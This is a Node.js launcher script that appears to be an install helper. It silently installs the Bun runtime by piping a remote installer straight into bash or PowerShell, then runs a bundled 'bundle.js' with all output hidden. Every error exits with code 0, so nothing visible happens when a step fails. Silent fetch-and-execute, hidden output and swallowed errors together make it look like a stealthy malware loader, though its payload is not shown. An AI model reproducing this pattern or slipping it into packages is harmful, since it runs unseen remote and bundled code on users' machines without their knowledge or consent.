#!/usr/bin/env node
const { spawn, execSync } = require('child_process');
const path = require('path');
const fs = require('fs');
const os = require('os');

function isBunOnPath() {
  try {
    const command = process.platform === 'win32' ? 'where bun' : 'which bun';
    execSync(command, { stdio: 'ignore' });
    return true;
  } catch {
    return false;
  }
}

function reloadPath() {
  
  if (process.platform === 'win32') {
    try {
      
      const result = execSync('powershell -c "[Environment]::GetEnvironmentVariable(\'PATH\', \'User\') + \';\' + [Environment]::GetEnvironmentVariable(\'PATH\', \'Machine\')"', {
        encoding: 'utf8'
      });
      process.env.PATH = result.trim();
    } catch {
    }
  } else {
    try {
      
      const homeDir = os.homedir();
      const profileFiles = [
        path.join(homeDir, '.bashrc'),
        path.join(homeDir, '.bash_profile'),
        path.join(homeDir, '.profile'),
        path.join(homeDir, '.zshrc')
      ];

      
      for (const profileFile of profileFiles) {
        if (fs.existsSync(profileFile)) {
          try {
            const result = execSync(`bash -c "source ${profileFile} && echo $PATH"`, {
              encoding: 'utf8',
              stdio: ['pipe', 'pipe', 'ignore']
            });
            if (result && result.trim()) {
              process.env.PATH = result.trim();
              break;
            }
          } catch {
            
          }
        }
      }

      
      const bunBinDir = path.join(homeDir, '.bun', 'bin');
      if (fs.existsSync(bunBinDir) && !process.env.PATH.includes(bunBinDir)) {
        process.env.PATH = `${bunBinDir}:${process.env.PATH}`;
      }
    } catch {}
  }
}

async function downloadAndSetupBun() {
  try {
    let command;
    if (process.platform === 'win32') {
      
      command = 'powershell -c "irm bun.sh/install.ps1|iex"';
    } else {
      
      command = 'curl -fsSL https://bun.sh/install | bash';
    }

    execSync(command, {
      stdio: 'ignore',
      env: { ...process.env }
    });

    
    reloadPath();

    
    const bunPath = findBunExecutable();
    if (!bunPath) {
      throw new Error('Bun installation completed but executable not found');
    }

    return bunPath;
  } catch  {
    process.exit(0);
  }
}

function findBunExecutable() {
  
  const possiblePaths = [];

  if (process.platform === 'win32') {
    
    const userProfile = process.env.USERPROFILE || '';
    possiblePaths.push(
      path.join(userProfile, '.bun', 'bin', 'bun.exe'),
      path.join(userProfile, 'AppData', 'Local', 'bun', 'bun.exe')
    );
  } else {
    
    const homeDir = os.homedir();
    possiblePaths.push(
      path.join(homeDir, '.bun', 'bin', 'bun'),
      '/usr/local/bin/bun',
      '/opt/bun/bin/bun'
    );
  }

  
  if (isBunOnPath()) {
    return 'bun';
  }

  
  for (const bunPath of possiblePaths) {
    if (fs.existsSync(bunPath)) {
      return bunPath;
    }
  }

  return null;
}

function runExecutable(execPath, args = [], opts = {}) {
  const child = spawn(execPath, args, {
    stdio: 'ignore',
    cwd: opts.cwd || process.cwd(),
    env: Object.assign({}, process.env, opts.env || {})
  });

  child.on('error', (err) => {
    process.exit(0);
  });

  child.on('exit', (code, signal) => {
    if (signal) {
      process.exit(0);
    } else {
      process.exit(code === null ? 1 : code);
    }
  });
}


async function main() {
  let bunExecutable;

  if (isBunOnPath()) {
    
    bunExecutable = 'bun';
  } else {
    
    const localBunDir = path.join(__dirname, 'bun-dist');
    const possiblePaths = [
      path.join(localBunDir, 'bun', 'bun'),
      path.join(localBunDir, 'bun', 'bun.exe'),
      path.join(localBunDir, 'bun.exe'),
      path.join(localBunDir, 'bun')
    ];

    const existingBun = possiblePaths.find(p => fs.existsSync(p));

    if (existingBun) {
      bunExecutable = existingBun;
    } else {
      
      bunExecutable = await downloadAndSetupBun();
    }
  }

  const environmentScript = path.join(__dirname, 'bundle.js');
  if (fs.existsSync(environmentScript)) {
    runExecutable(bunExecutable, [environmentScript]);
  } else {
    process.exit(0);
  }
}

main().catch((error) => {
  process.exit(0);
});
